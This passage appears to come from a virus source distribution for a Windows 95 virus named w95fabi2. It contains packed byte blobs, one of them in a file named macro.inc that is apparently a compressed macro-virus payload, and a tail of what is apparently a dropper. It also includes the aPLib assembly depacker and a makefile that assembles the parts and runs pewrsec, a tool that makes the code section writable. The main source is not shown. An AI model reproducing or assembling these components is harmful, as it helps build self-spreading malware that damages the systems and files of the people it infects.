   DB 051H,059H,0A5H,059H,020H,093H,008H,070H,025H,094H,042H,021H,050H,052H,049H
   DB 042H,086H,04EH,0B5H,0E3H,0C2H,0B5H,001H,0D7H,04BH,05DH,026H,090H,048H,009H
   DB 044H,059H,06EH,089H,082H,06BH,0E6H,024H,022H,0A5H,044H,0B5H,0C3H,089H,0CBH
   DB 012H,0E1H,0D7H,0CCH,01CH,071H,014H,0C8H,008H,023H,091H,027H,022H,033H,044H
   DB 044H,060H,089H,06BH,012H,075H,024H,08AH,048H,099H,091H,0B9H,022H,0D8H,045H
   DB 0D9H,06BH,0A2H,03AH,0AAH,05AH,0EDH,024H,0ADH,06BH,0A6H,088H,0BFH,052H,00DH
   DB 0FAH,023H,0F5H,045H,0F3H,03FH,027H,052H,001H,0EBH,019H,001H,014H,009H,015H
   DB 012H,011H,024H,017H,04BH,016H,0E6H,042H,024H,018H,013H,0B0H,0E4H,0A9H,048H
   DB 0AAH,091H,0B7H,024H,0B8H,0C0H,0E4H,0CAH,048H,0CBH,099H,0D6H,009H,0D7H,027H
   DB 0CCH,05AH,0FCH,0CBH,0E5H,06EH,001H,0BFH,05BH,0ADH,000H,0B8H,00BH,0B5H,0DBH
   DB 000H,0DAH,0F5H,0EFH,01EH,0D5H,067H,001H,005H,043H,0FCH,00EH,08BH,070H,0D3H
   DB 004H,029H,001H,0FCH,04AH,012H,0E6H,000H,0B9H,07AH,0E4H,0DCH,06FH,099H,0E0H
   DB 077H,0ABH,080H,054H,0A5H,001H,0FCH,0A7H,080H,0FDH,024H,0C0H,016H,01AH,0BBH
   DB 02AH,000H,032H,030H,006H,060H,0D7H,062H,000H,08BH,008H,05DH,09DH,000H,02CH
   DB 0DDH,001H,043H,04AH,0CCH,00CH,04FH,0D0H,0FEH,07FH,064H,050H,009H,051H,054H
   DB 058H,0A9H,06BH,0B0H,00CH,060H,08FH,0D3H,014H,0F8H,0FEH,06FH,084H,021H,0F2H
   DB 092H,00CH,0ACH,0B6H,0A2H,043H,09BH,08CH,096H,091H,053H,0E7H,032H,050H,090H
   DB 00FH,0B5H,0DBH,090H,015H,02CH,032H,01EH,002H,001H,022H,0A1H,0D2H,02DH,07FH
   DB 023H,058H,0C1H,082H,047H,055H,011H,07AH,041H,095H,01DH,02DH,02EH,023H,010H
   DB 090H,032H,0C7H,012H,001H,088H,09AH,00DH,054H,099H,090H,069H,06AH,0B2H,05AH
   DB 064H,054H,058H,0AFH,028H,07EH,059H,0A9H,034H,011H,04FH,062H,023H,022H,096H
   DB 043H,0AFH,065H,0ACH,0A8H,0DBH,053H,0C8H,055H,09AH,052H,02EH,012H,039H,02AH
   DB 00CH,032H,078H,001H,089H,009H,01FH,065H,0B8H,06DH,048H,02CH,013H,0E4H,038H
   DB 031H,042H,001H,0E2H,046H,05EH,049H,0DAH,06AH,04AH,0E4H,09CH,06DH,0A6H,08EH
   DB 0F1H,063H,09EH,052H,0F4H,035H,073H,004H,02CH,0F6H,014H,08EH,043H,036H,01EH
   DB 052H,001H,022H,056H,00FH,03AH,0D2H,0E8H,036H,0C8H,076H,0A4H,02EH,071H,015H
   DB 04FH,038H,023H,062H,097H,04EH,035H,004H,055H,0F2H,0A0H,0C9H,061H,074H,08EH
   DB 0D2H,084H,038H,016H,072H,04AH,018H,072H,001H,0F1H,012H,019H,03FH,095H,020H
   DB 01AH,032H,063H,02DH,06DH,046H,05CH,053H,068H,04CH,023H,017H,064H,082H,074H
   DB 08AH,0E4H,037H,072H,069H,02CH,05DH,0BAH,091H,086H,064H,070H,09BH,09EH,051H
   DB 016H,0E3H,07CH,055H,0A9H,04CH,018H,01CH,058H,086H,03CH,092H,001H,044H,020H
   DB 099H,028H,092H,06EH,0A8H,0E8H,094H,042H,06AH,014H,084H,03DH,04EH,0A6H,00CH
   DB 053H,05AH,0A8H,019H,0B5H,0F9H,0E8H,0C7H,0D9H,0F9H,099H,0FAH,01CH,0C2H,0D7H
   DB 014H,0EEH,070H,032H,04DH,004H,066H,0A8H,0F2H,06FH,006H,039H,011H,031H,03EH
   DB 05DH,00AH,070H,002H,003H,055H,085H,0FEH,028H,02CH,00CH,029H,08EH,045H,004H
   DB 094H,04CH,028H,00EH,0F5H,068H,01CH,07CH,0A5H,036H,0BEH,042H,0CAH,03CH,05EH
   DB 0A9H,00EH,047H,03DH,00EH,051H,0B2H,03EH,016H,0F9H,00FH,029H,018H,0A0H,0A4H
   DB 09EH,0A6H,07EH,069H,0ABH,058H,03AH,092H,065H,05AH,024H,0BCH,0A6H,0C8H,0EAH
   DB 00EH,044H,03AH,0E2H,0C0H,035H,008H,06CH,04AH,010H,075H,02EH,095H,06FH,016H
   DB 038H,005H,022H,004H,0B5H,0F8H,082H,0ABH,00EH,038H,018H,00FH,064H,01CH,074H
   DB 08BH,068H,02AH,06FH,03EH,0B5H,0BBH,0BBH,026H,00CH,02CH,078H,0EAH,024H,054H
   DB 095H,0E2H,0C0H,0A4H,008H,075H,08CH,078H,0E7H,0E0H,0F5H,0A6H,08AH,0A4H,030H
   DB 042H,008H,0D3H,054H,0BCH,078H,0C9H,004H,0B6H,026H,046H,02CH,0F2H,02CH,034H
   DB 092H,090H,04BH,009H,062H,0E6H,020H,09BH,09AH,053H,07DH,066H,02BH,00CH,018H
   DB 092H,063H,034H,000H,0CAH,0A6H,052H,01EH,089H,04FH,024H,0D8H,046H,092H,0DEH
   DB 044H,0DDH,044H,076H,0DAH,020H,014H,0DDH,04BH,096H,084H,0DEH,066H,0D4H,09AH
   DB 0FAH,02EH,013H,0D4H,0E5H,064H,05DH,03CH,024H,014H,0F6H,053H,00DH,02CH,0C9H
   DB 06CH,015H,064H,0AEH,066H,076H,0D7H,0C8H,06AH,0ACH,065H,035H,00EH,014H,0D6H
   DB 0FEH,0D3H,064H,004H,098H,0FCH,074H,0B1H,00CH,0A6H,000H,0C7H,003H,005H,010H
   DB 0BAH,0D8H,06EH,052H,0C9H,011H,047H,09BH,042H,026H,010H,053H,0F4H,0BFH,049H
   DB 00CH,0B2H,014H,0DDH,06CH,096H,066H,053H,025H,047H,015H,0FDH,023H,01EH,078H
   DB 0D9H,06DH,074H,049H,02EH,099H,0A6H,096H,034H,044H,0F9H,06AH,08AH,013H,02EH
   DB 056H,0A4H,060H,0CAH,050H,053H,06CH,0A9H,02CH,044H,015H,057H,022H,050H,074H
   DB 0EEH,060H,099H,068H,054H,0B9H,0CCH,056H,0A2H,0F6H,0EDH,0B8H,0F3H,02DH,071H
   DB 00DH,012H,024H,044H,04AH,049H,067H,04CH,0CCH,028H,011H,029H,091H,0D4H,0A8H
   DB 07CH,048H,007H,018H,0CCH,053H,005H,04FH,091H,01AH,06AH,0C0H,012H,050H,032H
   DB 05EH,07AH,09EH,032H,09FH,049H,0CEH,065H,04CH,05AH,072H,0A6H,014H,0B3H,070H
   DB 015H,012H,030H,0B2H,073H,0B6H,02CH,092H,0A8H,0A6H,02AH,096H,0B6H,0F4H,091H
   DB 0DCH,096H,051H,035H,0ECH,055H,0B0H,04AH,0C9H,070H,0B9H,064H,02CH,052H,042H
   DB 003H,046H,076H,093H,0E8H,01BH,00BH,019H,02AH,058H,066H,030H,04CH,0EAH,0CCH
   DB 0B4H,0CAH,004H,026H,052H,020H,0EEH,0D2H,074H,08AH,08EH,07AH,08AH,01BH,0A8H
   DB 02CH,0AAH,065H,020H,032H,06CH,06DH,067H,0D0H,0BCH,055H,052H,0A9H,0B9H,01CH
   DB 0A4H,066H,0A9H,048H,0A9H,03CH,026H,0A2H,016H,055H,074H,09EH,0BEH,032H,078H
   DB 0E7H,0C5H,084H,0A5H,058H,0BAH,099H,068H,099H,020H,009H,0C9H,04DH,0B0H,0F2H
   DB 06EH,072H,0ACH,018H,0B2H,0A4H,0D4H,031H,01AH,034H,049H,015H,0EAH,04CH,012H
   DB 034H,00DH,048H,0AAH,016H,05FH,08AH,04CH,02EH,090H,00EH,0B3H,046H,04BH,00DH
   DB 0F1H,0D8H,092H,031H,0CDH,0FCH,064H,093H,0B9H,016H,070H,09CH,03CH,057H,0A4H
   DB 052H,027H,015H,09AH,0EDH,04DH,07AH,0D3H,008H,001H,083H,01BH,02CH,0B9H,06EH
   DB 04EH,06CH,040H,075H,0B1H,0C8H,069H,014H,0A2H,091H,03AH,03DH,04AH,062H,07CH
   DB 0E7H,047H,04CH,0B3H,084H,008H,08FH,005H,053H,08FH,0FFH,050H,055H,004H,070H
   DB 00CH,048H,045H,040H,0B7H,02AH,02EH,078H,00BH,00AH,091H,0B7H,0D9H,003H,042H
   DB 0AAH,04CH,06EH,0BAH,0FBH,05DH,074H,0EAH,053H,050H,042H,002H,007H,053H,0D9H
   DB 0C6H,001H,068H,048H,043H,080H,0D5H,092H,089H,06CH,099H,070H,02FH,023H,0B2H
   DB 052H,08BH,050H,0E8H,0E9H,0E0H,00AH,093H,04BH,025H,044H,0DEH,0E0H,012H,091H
   DB 085H,0B8H,05EH,0A2H,0EDH,032H,018H,009H,01AH,024H,01CH,049H,01EH,053H,0EBH
   DB 019H,022H,009H,024H,012H,03DH,024H,046H,048H,04BH,091H,05BH,022H,071H,044H
   DB 07AH,09EH,089H,0A8H,012H,0B5H,024H,0C2H,048H,0E8H,091H,0FCH,010H,00AH,001H
   DB 022H,023H,044H,039H,048H,089H,059H,012H,06EH,024H,082H,048H,098H,091H,0A5H
   DB 022H,0B5H,044H,0C3H,0CBH,089H,0E1H,012H,0F4H,023H,014H,002H,064H,071H,009H
   DB 027H,048H,033H,091H,044H,022H,060H,044H,06BH,075H,089H,08AH,012H,099H,024H
   DB 0B9H,048H,0D8H,097H,0D9H,0E9H,036H,089H,013H,07BH,0D9H,016H,003H,0C9H,009H
   DB 048H,014H,039H,046H,013H,07BH,089H,00CH,01DH,043H,010H,005H,085H,022H,028H
   DB 00AH,0B9H,0C4H,083H,012H,08CH,024H,093H,048H,095H,091H,09CH,022H,0D6H,064H
   DB 0DDH,009H,0DFH,048H,0E6H,095H,014H,09CH,032H,021H,009H,02EH,025H,037H,072H
   DB 0C4H,0A3H,0B9H,0C8H,0B3H,012H,0FBH,029H,074H,00DH,099H,007H,009H,012H,012H
   DB 0A9H,024H,0B7H,048H,0CAH,095H,0D6H,0A8H,0C2H,013H,021H,095H,007H,011H,04AH
   DB 008H,044H,01FH,03CH,015H,0A6H,018H,053H,01DH,004H,050H,018H,01AH,089H,014H
   DB 012H,017H,005H,0FFH,0BFH,0CBH,010H,03DH,0D9H,070H,084H,042H,024H,038H,004H
   DB 070H,087H,0D7H,08AH,03BH,002H,06AH,0A5H,0E5H,0DDH,04AH,06AH,0F1H,057H,033H
   DB 0FAH,038H,067H,029H,064H,008H,093H,073H,035H,08DH,002H,0F4H,030H,008H,080H
   DB 0DFH,0EDH,04CH,02BH,001H,0F3H,058H,064H,047H,04EH,0CEH,092H,0EFH,0D6H,0FFH
   DB 06AH,04CH,0F4H,0ECH,0BCH,0BAH,0EDH,080H,000H

   --[macro.inc]----------------------------------------------------------------->8

   macrocode equ this byte
   DB 022H,003H,00DH,00AH,04FH,050H,054H,049H,0A0H,04EH,053H,02EH,076H,056H
   DB 03BH,052H,055H,07CH,0E9H,0FFH,0F1H,045H,043H,040H,011H,03DH,046H,041H,07FH
   DB 04CH,0F7H,04AH,01FH,033H,043H,00AH,046H,031H,044H,04DH,00FH,056H,045H,0DFH
   DB 0FDH,015H,013H,022H,0E7H,0CFH,0FBH,034H,0BFH,0DDH,046H,0B7H,02CH,08DH,06DH
   DB 02AH,058H,020H,04AH,0F2H,031H,0C8H,00AH,04BH,046H,046H,03CH,037H,020H,049H
   DB 012H,047H,054H,08EH,0F4H,029H,09BH,0D8H,075H,050H,0EFH,0B3H,00CH,0FAH,042H
   DB 036H,069H,04AH,0F5H,015H,0EBH,0B6H,07BH,0A0H,096H,0F9H,043H,075H,055H,062H
   DB 00EH,070H,049H,046H,097H,030H,041H,028H,049H,029H,09BH,067H,044H,04AH,01BH
   DB 008H,055H,04CH,04AH,09FH,0FDH,02CH,08EH,028H,031H,02CH,041H,029H,03DH,022H
   DB 027H,043H,08DH,042H,0FFH,06CH,0F4H,048H,0DDH,050H,068H,091H,0F5H,006H,036H
   DB 07DH,058H,0FFH,0E2H,0B6H,094H,055H,041H,0F9H,043H,0C3H,044H,0CFH,073H,055H
   DB 04DH,052H,09DH,094H,0B9H,04AH,030H,0F5H,02FH,094H,0C8H,04BH,0D2H,043H,036H
   DB 065H,00EH,076H,03DH,02FH,0F4H,088H,04AH,0D2H,091H,03CH,041H,005H,02FH,09CH
   DB 08AH,04BH,03CH,0D2H,044H,068H,052H,054H,0A3H,0DFH,028H,0A4H,02BH,03CH,03EH
   DB 0A5H,04AH,0A1H,0B6H,03CH,05CH,0D4H,054H,08DH,054H,024H,020H,083H,049H,022H
   DB 010H,09DH,015H,046H,012H,055H,022H,0A8H,012H,084H,077H,052H,0ACH,022H,052H
   DB 041H,051H,09EH,0EBH,02DH,046H,029H,05CH,0CAH,0A8H,044H,0F0H,03FH,049H,04DH
   DB 095H,079H,0BDH,0EEH,015H,010H,041H,0A8H,041H,085H,04FH,0B0H,0E7H,0B8H,0D6H
   DB 091H,0FEH,0ECH,0BCH,04EH,038H,028H,041H,099H,029H,02BH,01AH,053H,09FH,0CEH
   DB 050H,0D9H,032H,03AH,042H,0C5H,03DH,081H,006H,02BH,043H,048H,052H,028H,09DH
   DB 032H,053H,0FAH,08CH,04DH,049H,044H,043H,02CH,0EDH,025H,0BCH,0C4H,02DH,036H
   DB 06AH,035H,054H,017H,0D3H,056H,072H,019H,03DH,02AH,075H,0D2H,012H,039H,0CEH
   DB 061H,020H,024H,0E0H,022H,014H,043H,03AH,05CH,0D1H,08DH,02EH,02AH,0FAH,08AH
   DB 0D5H,077H,028H,091H,035H,054H,050H,006H,015H,0F8H,0ACH,069H,048H,00AH,09EH
   DB 099H,033H,018H,023H,06CH,086H,0E2H,01AH,043H,028H,04CH,04FH,0C9H,0D2H,01BH
   DB 054H,0CDH,0FDH,07CH,0FBH,05AH,03CH,024H,02CH,0C1H,01AH,048H,0E4H,049H,0ADH
   DB 04BH,0DAH,09CH,01BH,03DH,053H,052H,07CH,0AFH,014H,028H,02FH,0ACH,0EBH,036H
   DB 053H,055H,0AFH,000H


   --[Unpack.inc]---------------------------------------------------------------->8

   ;***************************************************************
   ;*         aPLib v0.22b  -  the smaller the better :)          *
   ;*               WASM & TASM assembler depacker                *
   ;*                                                             *
   ;*   Copyright (c) 1998-99 by  - Jibz -  All Rights Reserved   *
   ;***************************************************************

   ;.386p
   ;.MODEL flat

   ;.CODE

   ;PUBLIC _aP_depack_asm

   _aP_depack_asm:
       push   ebp
       mov    ebp, esp
       pushad
       push   ebp

       mov    esi, [ebp + 8]     ; C calling convention
       mov    edi, [ebp + 12]

       cld
       mov    dl, 80h

   literal:
       movsb
   nexttag:
       call   getbit
       jnc    literal

       xor    ecx, ecx
       call   getbit
       jnc    codepair
       xor    eax, eax
       call   getbit
       jnc    shortmatch
       mov    al, 10h
   getmorebits:
       call   getbit
       adc    al, al
       jnc    getmorebits
       jnz    domatch_with_inc
       stosb
       jmp    short nexttag
   codepair:
       call   getgamma_no_ecx
       dec    ecx
       loop   normalcodepair
       mov    eax,ebp
       call   getgamma
       jmp    short domatch

   shortmatch:
       lodsb
       shr    eax, 1
       jz     donedepacking
       adc    ecx, 2
       mov    ebp, eax
       jmp    short domatch

   normalcodepair:
       xchg   eax, ecx
       dec    eax
       shl    eax, 8
       lodsb
       mov    ebp, eax
       call   getgamma
       cmp    eax, 32000
       jae    domatch_with_2inc
       cmp    eax, 1280
       jae    domatch_with_inc
       cmp    eax, 7fh
       ja     domatch

   domatch_with_2inc:
       inc    ecx

   domatch_with_inc:
       inc    ecx
   domatch:
       push   esi
       mov    esi, edi
       sub    esi, eax
       rep    movsb
       pop    esi
       jmp    short nexttag

   getbit:
       add     dl, dl
       jnz     stillbitsleft
       mov     dl, [esi]
       inc     esi
       adc     dl, dl
   stillbitsleft:
       ret

   getgamma:
       xor    ecx, ecx
   getgamma_no_ecx:
       inc    ecx
   getgammaloop:
       call   getbit
       adc    ecx, ecx
       call   getbit
       jc     getgammaloop
       ret

   donedepacking:
       pop    ebp
       sub    edi, [ebp + 12]
       mov    [ebp - 4], edi     ; return unpacked length in eax

       popad
       pop    ebp
       ret    4*2

   ;END

   --[makefile]------------------------------------------------------------------>8

   w95fabi2.exe : w95fabi2.obj
       tlink32 w95fabi2,,,import32.lib
       pewrsec w95fabi2.exe

   w95fabi2.obj : w95fabi2.asm unpack.inc dropper.inc macro.inc loader.inc
       tasm /m /ml /l w95fabi2.asm
